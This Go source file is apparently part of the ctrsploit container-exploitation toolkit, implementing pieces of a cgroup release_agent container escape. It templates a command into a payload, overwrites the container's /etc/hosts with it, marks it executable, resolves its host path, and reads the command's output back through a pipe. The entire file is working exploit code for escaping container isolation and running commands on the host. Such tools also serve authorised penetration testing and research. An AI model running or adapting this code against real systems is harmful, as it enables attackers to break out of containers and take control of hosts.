package release_agent

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"strings"
	"syscall"

	"github.com/ctrsploit/ctrsploit/pkg/hostpath"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs"
)

func generatePayload(cmd string, w *os.File) (string, error) {
	fi, err := w.Stat()
	if err != nil {
		return "", fmt.Errorf("failed to stat pipe: %w", err)
	}
	stat, ok := fi.Sys().(*syscall.Stat_t)
	if !ok {
		return "", fmt.Errorf("failed to convert pipe to stat_t, %v", fi)
	}
	payload := awesome_libs.Format(PayloadTemplate, awesome_libs.Dict{
		"fd":   w.Fd(),
		"inum": stat.Ino,
		"cmd":  cmd,
		"end":  END,
	}, "{{", "}}")
	return payload, nil
}

func writePayload(payload string) (string, error) {
	path, err := hostpath.EtcHosts()
	if err != nil {
		return "", fmt.Errorf("failed to get host path of /etc/hosts: %w", err)
	}
	// write payload to /etc/hosts
	log.Logger.Info("overwrite payload to /etc/hosts")
	err = os.WriteFile("/etc/hosts", []byte(payload), 0755)
	if err != nil {
		return "", fmt.Errorf("failed to write to /etc/hosts: %w", err)
	}
	err = os.Chmod("/etc/hosts", 0755)
	if err != nil {
		return "", fmt.Errorf("failed to chmod to /etc/hosts: %w", err)
	}
	return path, nil
}

func output(r *os.File) ([]byte, error) {
	// read result
	var resultBuffer bytes.Buffer
	buf := make([]byte, 1024)
	for {
		n, err := r.Read(buf)
		if n > 0 {
			resultBuffer.Write(buf[:n])
			if strings.Contains(resultBuffer.String(), END) {
				break
			}
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			return nil, fmt.Errorf("failed to read from pipe: %w", err)
		}
	}
	result := bytes.TrimSuffix(resultBuffer.Bytes(), []byte(END+"\n"))
	return result, nil
}
